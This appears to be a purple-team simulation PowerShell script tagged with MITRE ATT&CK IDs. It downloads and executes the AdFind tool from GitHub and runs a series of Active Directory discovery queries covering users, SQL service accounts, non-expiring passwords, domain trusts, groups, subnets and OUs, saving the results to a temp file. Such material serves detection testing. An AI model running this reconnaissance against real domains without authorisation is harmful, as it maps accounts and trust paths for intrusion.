<#
    T1087.002 - Account Discovery: Domain Account
    T1482 - Domain Trust Discovery
    T1069.002 - Permission Groups Discovery: Domain Groups
    T1018 - Remote System Discovery
    T1016 - System Network Configuration Discovery
    T1105 - Ingress Tool Transfer
    Download AdFind and execute multiple enumerations 
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force -Verbose

$url = 'https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/AdFind.zip'
$dumpfile = "$env:tmp\adfind_results.txt"
$outfilezip = "$env:tmp\adfnd.zip"
$outdir = "$env:tmp\adfnd\"
$outfile = "$env:tmp\adfnd\AdFind.exe"

try{
    Write-Host -ForegroundColor Cyan "Downloading Adfind.exe from $url to $outfilezip"
    Invoke-WebRequest -Uri $url -OutFile $outfilezip -Verbose
    if ($outfilezip){
        Write-Host -ForegroundColor Green "$url downloaded successfully"
        Write-Host -ForegroundColor Cyan "Extracting archive $outfilezip to $outdir ..."
        Expand-Archive -Path $outfilezip -DestinationPath $outdir -Verbose -Force
        if ($outfile){
            Write-Host -ForegroundColor Green "$outfilezip successfully extracted to $outdir"
            Write-Host -ForegroundColor Cyan "Executing $outfile to find all users in the domain"
            Add-Content $dumpfile "`n---------- $(Get-Date) : AdFind Execution traces ----------`n" -Verbose -Force
            $result_all_users = & $outfile -f "(objectcategory=person)"
            if ($result_all_users){
                Write-Host -ForegroundColor Green "$outfile executed successfully to find all users in the domain"
                Write-Host -ForegroundColor Cyan "Saving AdFind results in $dumpfile"
                Add-Content $dumpfile "`n---- Find all users results ----`n" -Verbose -Force
                $result_all_users | Out-File -FilePath $dumpfile -Encoding UTF8 -Verbose -Append
            }
            else{
                Write-Host -ForegroundColor Red "Error: Failed to execute Adfind.exe to find all users in the domain"
            }
            Write-Host -ForegroundColor Cyan "Executing $outfile to find sql servers in the domain"
            $result_sql = & $outfile -f "ServicePrincipalName=MSSQLSvc*"
            if ($result_sql){
                Write-Host -ForegroundColor Green "$outfile executed successfully to find sql servers in the domain"
                Write-Host -ForegroundColor Cyan "Saving AdFind results in $dumpfile"
                Add-Content $dumpfile "`n---- Find sql servers results ----`n" -Verbose -Force
                $result_sql | Out-File -FilePath $dumpfile -Encoding UTF8 -Verbose -Append
            }
            else{
                Write-Host -ForegroundColor Red "Error: Failed to execute Adfind.exe to find sql servers in the domain"
            }
            Write-Host -ForegroundColor Cyan "Executing $outfile to find all users with password that never expire"
            $result_users_never_expire = & $outfile -f "(&(objectCategory=person)(objectClass=user)(pwdLastSet=0))"
            if ($result_users_never_expire){
                Write-Host -ForegroundColor Green "$outfile executed successfully to find users with password that never expire"
                Write-Host -ForegroundColor Cyan "Saving AdFind results in $dumpfile"
                Add-Content $dumpfile "`n---- Find users with password never expire results ----`n" -Verbose -Force
                $result_users_never_expire | Out-File -FilePath $dumpfile -Encoding UTF8 -Verbose -Append
            }
            else{
                Write-Host -ForegroundColor Red "Error: Failed to execute Adfind.exe to find users with password never expire"
            }
            Write-Host -ForegroundColor Cyan "Executing $outfile to search the domain for all Global Catalogs, and then prints out a trust dump of the trust relationships associated with the domain"
            $result_trustdump = & $outfile -gcb -sc "trustdmp"
            if ($result_trustdump){
                Write-Host -ForegroundColor Green "$outfile executed successfully to search the domain for all Global Catalogs, and then prints out a trust dump of the trust relationships associated with the domain"
                write-host -ForegroundColor Cyan "Saving AdFind results in $dumpfile"
                Add-Content $dumpfile "`n---- Find all Global Catalogs and trust dump results ----`n" -Verbose -Force
                $result_trustdump | Out-File -FilePath $dumpfile -Encoding UTF8 -Verbose -Append
            }
            else{
                Write-Host -ForegroundColor Red "Error: Failed to execute Adfind.exe to search the domain for all Global Catalogs, and then prints out a trust dump of the trust relationships associated with the domain"
            }
            Write-Host -ForegroundColor Cyan "Executing $outfile to find all groups in the domain"
            $result_groups = & $outfile -f "(objectcategory=group)"
            if ($result_groups){
                Write-Host -ForegroundColor Green "$outfile executed successfully to find all groups in the domain"
                Write-Host -ForegroundColor Cyan "Saving AdFind results in $dumpfile"
                Add-Content $dumpfile "`n---- Find all groups in the domain ----`n" -Verbose -Force
                $result_groups | Out-File -FilePath $dumpfile -Encoding UTF8 -Verbose -Append
            }
            else{
                Write-Host -ForegroundColor Red "Error: Failed to execute Adfind.exe to find all groups in the domain"
            }
            Write-Host -ForegroundColor Cyan "Executing $outfile to find all subnets in the domain"
            $result_subnets = & $outfile -subnets -f "(objectCategory=subnet)"
            if ($result_subnets){
                Write-Host -ForegroundColor Green "$outfile executed successfully to find all subnets in the domain"
                Write-Host -ForegroundColor Cyan "Saving AdFind results in $dumpfile"
                Add-Content $dumpfile "`n---- Find all subnets in the domain ----`n" -Verbose -Force
                $result_subnets | Out-File -FilePath $dumpfile -Encoding UTF8 -Verbose -Append
            }
            else{
                Write-Host -ForegroundColor Red "Error: Failed to execute Adfind.exe to find all subnets in the domain"
            }
            Write-Host -ForegroundColor Cyan "Executing $outfile to find all OUs in the domain"
            $result_OU = & $outfile -f "(objectcategory=organizationalUnit)"
            if ($result_OU){
                Write-Host -ForegroundColor Green "$outfile executed successfully to find all OUs in the domain"
                Write-Host -ForegroundColor Cyan "Saving AdFind results in $dumpfile"
                Add-Content $dumpfile "`n---- Find all OUs in the domain ----`n" -Verbose -Force
                $result_OU | Out-File -FilePath $dumpfile -Encoding UTF8 -Verbose -Append
            }
            else{
                Write-Host -ForegroundColor Red "Error: Failed to execute Adfind.exe to find all OUs in the domain"
            }
            if ($dumpfile){
                Write-Host -ForegroundColor Green "AdFind results successfully saved in $dumpfile"
            }
            else{
                Write-Host -ForegroundColor Red "Error: Failed to save AdFind results in $dumpfile, something went wrong..."
            }
        }
        else{
            Write-Host -ForegroundColor Red "Error: Failed to extract archive $outfilezip"
        }
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download $url to $outfilezip, something went wrong..."
    }
}
catch{
    Write-Host -ForegroundColor Red "Error: $_"
}

Stop-Transcript
